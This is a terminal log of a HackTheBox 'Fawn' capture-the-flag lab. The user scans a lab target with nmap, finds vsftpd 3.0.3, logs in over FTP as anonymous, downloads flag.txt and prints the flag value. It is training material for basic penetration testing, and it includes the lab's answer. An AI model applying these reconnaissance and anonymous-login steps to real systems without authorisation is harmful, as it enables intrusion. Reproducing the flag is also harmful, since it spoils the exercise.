  "Fawn" HackTheBox Capture the Flag

  Target IP: 10.129.168.127

# START

┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ ping 10.129.168.127

PING 10.129.168.127 (10.129.168.127) 56(84) bytes of data.
64 bytes from 10.129.168.127: icmp_seq=1 ttl=63 time=65.8 ms
64 bytes from 10.129.168.127: icmp_seq=2 ttl=63 time=65.9 ms
64 bytes from 10.129.168.127: icmp_seq=3 ttl=63 time=66.1 ms
64 bytes from 10.129.168.127: icmp_seq=4 ttl=63 time=66.0 ms
64 bytes from 10.129.168.127: icmp_seq=5 ttl=63 time=66.0 ms
64 bytes from 10.129.168.127: icmp_seq=6 ttl=63 time=66.5 ms
64 bytes from 10.129.168.127: icmp_seq=7 ttl=63 time=66.4 ms
64 bytes from 10.129.168.127: icmp_seq=8 ttl=63 time=66.1 ms
64 bytes from 10.129.168.127: icmp_seq=9 ttl=63 time=66.0 ms
^C
--- 10.129.168.127 ping statistics ---
9 packets transmitted, 9 received, 0% packet loss, time 8010ms
rtt min/avg/max/mdev = 65.778/66.076/66.511/0.225 ms

┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ sudo nmap 10.129.168.127
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-19 04:49 EDT
Nmap scan report for 10.129.168.127
Host is up (0.069s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 1.36 seconds

┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ sudo nmap -sV 10.129.168.127
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-19 04:50 EDT
Nmap scan report for 10.129.168.127
Host is up (0.069s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.64 seconds

┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ sudo apt install ftp -y
ftp is already the newest version (20230507-2).
The following package was automatically installed and is no longer required:
  linux-image-6.12.73+deb13-amd64
Use 'sudo apt autoremove' to remove it.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 489

┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ ftp -?
usage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME]
           [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE]
           [[USER@]HOST [PORT]]
           [[USER@]HOST:[PATH][/]]
           [file:///PATH]
           [ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]
           [http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           [https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           ...
       ftp -u URL FILE ...
       ftp -?
  -4            Only use IPv4 addresses
  -6            Only use IPv6 addresses
  -A            Force active mode
  -a            Use anonymous login
  -d            Enable debugging
  -e            Disable command-line editing
  -f            Force cache reload for FTP or HTTP proxy transfers
  -g            Disable file name globbing
  -i            Disable interactive prompt during multiple file transfers
  -N NETRC      Use NETRC instead of ~/.netrc
  -n            Disable auto-login
  -o OUTPUT     Save auto-fetched files to OUTPUT
  -P PORT       Use port PORT
  -p            Force passive mode
  -q QUITTIME   Quit if connection stalls for QUITTIME seconds
  -R            Restart non-proxy auto-fetch
  -r RETRY      Retry failed connection attempts after RETRY seconds
  -s SRCADDR    Use source address SRCADDR
  -t            Enable packet tracing
  -T DIR,MAX[,INC]
                Set maximum transfer rate for direction DIR to MAX bytes/s,
                with optional increment INC bytes/s
  -u URL        URL to upload file arguments to
  -V            Disable verbose and progress
  -v            Enable verbose and progress
  -x XFERSIZE   Set socket send and receive size to XFERSIZE
  -?            Display this help and exit

┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ ftp 10.129.168.127
Connected to 10.129.168.127.
220 (vsFTPd 3.0.3)
Name (10.129.168.127:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!		epsv6		mget		preserve	sendport
$		exit		mkdir		progress	set
account		features	mls		prompt		site
append		fget		mlsd		proxy		size
ascii		form		mlst		put		sndbuf
bell		ftp		mode		pwd		status
binary		gate		modtime		quit		struct
bye		get		more		quote		sunique
case		glob		mput		rate		system
cd		hash		mreget		rcvbuf		tenex
cdup		help		msend		recv		throttle
chmod		idle		newer		reget		trace
close		image		nlist		remopts		type
cr		lcd		nmap		rename		umask
debug		less		ntrans		reset		unset
delete		lpage		open		restart		usage
dir		lpwd		page		rhelp		user
disconnect	ls		passive		rmdir		verbose
edit		macdef		pdir		rstatus		xferbuf
epsv		mdelete		pls		runique		?
epsv4		mdir		pmlsd		send
ftp> ls
229 Entering Extended Passive Mode (|||33102|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||20938|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32       38.24 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.46 KiB/s)
ftp> bye
221 Goodbye.
┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ ls
cacert.der  Documents  flag.txt  my_data   Templates
Desktop     Downloads  Music     Pictures  Videos
┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]
└──╼ [★]$ cat flag.txt
035db21c881520061c53e0536e44f815┌─[us-starting-point-1-dhcp]─[10.10.15.16]─[heems@htb-medtpelty8]─[~]

# FLAG CAPTURED
